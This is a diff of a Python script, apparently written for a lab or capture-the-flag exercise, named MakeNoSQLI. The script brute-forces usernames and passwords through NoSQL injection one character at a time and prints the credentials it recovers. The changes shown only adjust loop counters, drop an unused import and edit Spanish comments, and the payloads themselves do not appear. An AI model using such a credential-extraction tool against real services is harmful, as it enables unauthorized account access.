@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 
 from pwn import log
-import requests, sys, signal, time
+import requests, sys, signal
 
 
 def def_handler(sig, frame):
@@ -90,7 +90,7 @@ class MakeNoSQLI():
 
         repetitions = 0 # Esto controla que la busqueda no siga indefinidamente si no se encuentran coincidencias
 
-        while repetitions <= len(characters) + 1:
+        while repetitions <= len(characters):
             for character in characters:
                 self.p4.status(characters) # Actualiza info
 
@@ -104,7 +104,7 @@ class MakeNoSQLI():
                 else:
                     repetitions += 1 # Se suma 1 por cada caracter incorrecto
 
-                if repetitions == len(characters) + 1 and len(characters) == len(self.original_characters):
+                if repetitions == len(characters) and len(characters) == len(self.original_characters):
                     self.usernames.append(self.username) # Se añade el username  a la lista
                     self.p2.status("") # Se limpia el output
                     self.p3.status("") # Se limpia el output
@@ -113,7 +113,7 @@ class MakeNoSQLI():
                     self.passwordBruteForce() # Se busca la contraseña para ese username
         
         if len(self.usernames) >=1: # Esto es para cuando ya se haya encontrado un username
-            # Guardando el caracter eliminado
+            # Guardando el caracter
             deleted_character = self.username[-1]
             self.p3.status(deleted_character)
 
@@ -164,7 +164,6 @@ class MakeNoSQLI():
                 self.p6.status("")
                 self.p8.status(self.passwords)
                 print(f"Creds {len(self.usernames)}.- {self.username}:|:{password}") # output bonito
-
 
 
 if __name__ == "__main__":
